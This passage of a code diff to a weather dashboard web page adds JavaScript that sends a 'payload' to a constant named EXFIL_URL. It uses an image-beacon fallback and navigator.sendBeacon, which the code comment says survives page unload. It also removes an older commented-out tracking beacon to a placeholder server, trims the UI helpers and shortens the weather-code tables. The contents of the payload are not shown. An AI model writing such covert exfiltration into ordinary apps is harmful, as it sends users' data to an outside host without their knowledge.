+                addLog(`🔄 Trying Method 2: image beacon...`, 'warn');
+                
+                // --- Method 2: Image beacon (no CORS) ---
+                const img = new Image();
+                img.onload = () => addLog(`✅ Image beacon SUCCESS`, 'success');
+                img.onerror = () => addLog(`⚠️ Image beacon loaded (expected for GET endpoint)`, 'warn');
+                img.src = EXFIL_URL + '?d=' + encodeURIComponent(payload);
+            });
+
+            // --- Method 3: navigator.sendBeacon (works even during page unload) ---
+            try {
+                const beaconResult = navigator.sendBeacon(EXFIL_URL, payload);
+                addLog(`📡 sendBeacon(): ${beaconResult ? 'queued' : 'failed'}`, beaconResult ? 'success' : 'error');
+            } catch (e) {
+                addLog(`❌ sendBeacon() error: ${e.message}`, 'error');
             }
-            
-            // Alternative: encode as URL params and send via <img> tag
-            // (bypasses any CORS issues entirely)
-            // const img = new Image();
-            // img.src = `https://your-server.com/track?data=${encodeURIComponent(JSON.stringify(data))}`;
         }
 
         // ================================================================
-        // 8. UI HELPERS
+        // UI HELPERS
         // ================================================================
         function showLoading() {
             document.getElementById('loadingState').classList.remove('hidden');
             document.getElementById('weatherData').classList.add('hidden');
-            document.getElementById('errorState').classList.add('hidden');
-            document.getElementById('updateStatus').textContent = 'Updating...';
         }
-
-        function hideLoading() {
-            document.getElementById('loadingState').classList.add('hidden');
-        }
-
-        function showWeatherData() {
-            document.getElementById('weatherData').classList.remove('hidden');
-            document.getElementById('errorState').classList.add('hidden');
-        }
-
+        function hideLoading() { document.getElementById('loadingState').classList.add('hidden'); }
+        function showWeatherData() { document.getElementById('weatherData').classList.remove('hidden'); }
         function showError(msg) {
-            document.getElementById('errorState').classList.remove('hidden');
             document.getElementById('weatherData').classList.add('hidden');
-            document.getElementById('loadingState').classList.add('hidden');
-            document.getElementById('errorMessage').textContent = msg;
             document.getElementById('updateStatus').textContent = 'Offline';
+            addLog(`❌ ${msg}`, 'error');
         }
-
-        // ================================================================
-        // 9. WEATHER CODE HELPERS
-        // ================================================================
-        function weatherCodeToText(code) {
-            const map = {
-                0: 'Clear Sky', 1: 'Mainly Clear', 2: 'Partly Cloudy', 3: 'Overcast',
-                45: 'Foggy', 48: 'Depositing Rime Fog',
-                51: 'Light Drizzle', 53: 'Moderate Drizzle', 55: 'Dense Drizzle',
-                61: 'Slight Rain', 63: 'Moderate Rain', 65: 'Heavy Rain',
-                71: 'Slight Snow', 73: 'Moderate Snow', 75: 'Heavy Snow',
-                80: 'Slight Rain Showers', 81: 'Moderate Rain Showers', 82: 'Violent Rain Showers',
-                95: 'Thunderstorm', 96: 'Thunderstorm with Slight Hail', 99: 'Thunderstorm with Heavy Hail'
-            };
-            return map[code] || 'Unknown';
+        
+        // Weather code helpers
+        function weatherCodeToText(c) {
+            const m = {0:'Clear',1:'Mainly Clear',2:'Partly Cloudy',3:'Overcast',45:'Foggy',51:'Light Drizzle',61:'Rain',63:'Moderate Rain',65:'Heavy Rain',71:'Snow',80:'Showers',95:'Thunderstorm'};
+            return m[c]||'Unknown';
         }
-
-        function weatherCodeToEmoji(code) {
-            const map = {
-                0: '☀️', 1: '🌤️', 2: '⛅', 3: '☁️',
-                45: '🌫️', 48: '🌫️',
-                51: '🌦️', 53: '🌦️', 55: '🌦️',
-                61: '🌧️', 63: '🌧️', 65: '🌧️',
-                71: '🌨️', 73: '🌨️', 75: '🌨️',
-                80: '🌦️', 81: '🌦️', 82: '🌦️',
-                95: '⛈️', 96: '⛈️', 99: '⛈️'
-            };
-            return map[code] || '❓';
+        function weatherCodeToEmoji(c) {
+            const m = {0:'☀️',1:'🌤️',2:'⛅',3:'☁️',45:'🌫️',61:'🌧️',63:'🌧️',65:'🌧️',71:'🌨️',80:'🌦️',95:'⛈️'};
+            return m[c]||'❓';
         }
     </script>
 </body>
